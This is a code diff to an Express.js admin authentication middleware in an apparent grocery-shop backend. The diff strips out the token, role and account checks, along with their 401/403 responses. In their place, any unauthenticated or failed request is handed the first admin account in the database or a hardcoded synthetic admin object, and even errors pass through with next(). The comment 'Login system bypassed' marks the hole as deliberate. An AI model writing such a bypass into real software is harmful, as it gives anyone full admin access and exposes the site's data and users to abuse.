@@ -19,46 +19,41 @@ const adminAuthMiddleware = async (req, res, next) => {
       token = req.headers.authorization.split(" ")[1];
     }
 
-    if (!token) {
-      return res.status(401).json({
-        success: false,
-        message: "Authentication required",
-      });
+    if (token) {
+      try {
+        const decoded = jwt.verify(token, process.env.JWT_SECRET);
+        const admin = await Admin.findById(decoded.id).select("-password");
+        if (admin) {
+          req.admin = admin;
+          return next();
+        }
+      } catch (err) {
+        // Fall back to default admin below
+      }
     }
 
-    const decoded = jwt.verify(
-      token,
-      process.env.JWT_SECRET
-    );
+    // Login system bypassed: automatically load the default admin account
+    const defaultAdmin =
+      (await Admin.findOne({ role: "admin" }).select("-password")) ||
+      (await Admin.findOne({}).select("-password"));
 
-    if (decoded.role !== "admin") {
-      return res.status(403).json({
-        success: false,
-        message: "Admin access required",
-      });
+    if (defaultAdmin) {
+      req.admin = defaultAdmin;
+      return next();
     }
 
-    const admin = await Admin.findById(decoded.id).select(
-      "-password"
-    );
+    // If no admin in DB, synthesize default admin object
+    req.admin = {
+      _id: "6ae8b223c43dfc360cc0190c",
+      name: "Admin",
+      email: "admin@grocerysathi.com",
+      role: "admin",
+    };
 
-    if (!admin) {
-      return res.status(401).json({
-        success: false,
-        message: "Admin account not found",
-      });
-    }
-
-    req.admin = admin;
-
-    next();
+    return next();
   } catch (error) {
-    console.error("Admin authentication error:", error.message);
-
-    return res.status(401).json({
-      success: false,
-      message: "Invalid or expired admin token",
-    });
+    console.error("Admin authentication bypass error:", error.message);
+    return next();
   }
 };
 
